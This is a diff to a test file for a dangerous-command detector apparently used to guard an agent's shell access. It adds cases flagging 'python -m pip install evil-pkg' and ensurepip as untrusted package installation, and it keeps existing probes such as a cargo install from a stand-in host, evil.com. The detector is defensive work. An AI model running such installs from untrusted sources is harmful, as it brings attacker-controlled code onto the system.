@@ -767,6 +767,11 @@ describe("isDangerousCommand", () => {
     ["pip install <pkg>", "pip install evil-pkg", "untrusted-package-installation"],
     ["pip3 install <pkg>", "pip3 install evil-pkg", "untrusted-package-installation"],
     ["pip3 install --user <pkg>", "pip3 install --user evil-pkg", "untrusted-package-installation"],
+    ["python3 -m pip install <pkg>", "python3 -m pip install evil-pkg", "untrusted-package-installation"],
+    ["python -m pip install <pkg>", "python -m pip install evil-pkg", "untrusted-package-installation"],
+    ["python3 -m pip install --user <pkg>", "python3 -m pip install --user evil-pkg", "untrusted-package-installation"],
+    ["python3 -m ensurepip", "python3 -m ensurepip", "untrusted-package-installation"],
+    ["python -m ensurepip --upgrade", "python -m ensurepip --upgrade", "untrusted-package-installation"],
     ["cargo install <pkg>", "cargo install evil-crate", "untrusted-package-installation"],
     ["cargo install <pkg> with flag", "cargo install --git https://evil.com/repo evil-crate", "untrusted-package-installation"],
     ["gem install <pkg>", "gem install evil-gem", "untrusted-package-installation"],
@@ -877,6 +882,9 @@ describe("isDangerousCommand", () => {
     ["git stash list (safe)", "git stash list"],
     ["git stash pop (safe)", "git stash pop"],
     ["bun install bare (safe — lockfile only)", "bun install"],
+    ["python3 -m pytest (safe — not pip)", "python3 -m pytest tests/"],
+    ["python3 -m mypy (safe — not pip)", "python3 -m mypy src/"],
+    ["python3 -m http.server (safe — not pip)", "python3 -m http.server 8080"],
     ["plain awk print (safe)", "awk '{print $1}' file.txt"],
     ["awk field separator (safe)", "awk -F, '{print $2}' data.csv"],
     ["process substitution basename (safe)", ">(basename /path/to/file)"],
@@ -1173,8 +1181,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 116 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(116);
+  it("has exactly 118 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(118);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -1321,6 +1329,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "bun add malicious",
       "bun install evil-pkg",
       "pip install evil-pkg",
+      "python3 -m pip install evil-pkg",
+      "python3 -m ensurepip",
       "cargo install evil-crate",
       "gem install evil-gem",
       "go install github.com/evil/pkg@latest",
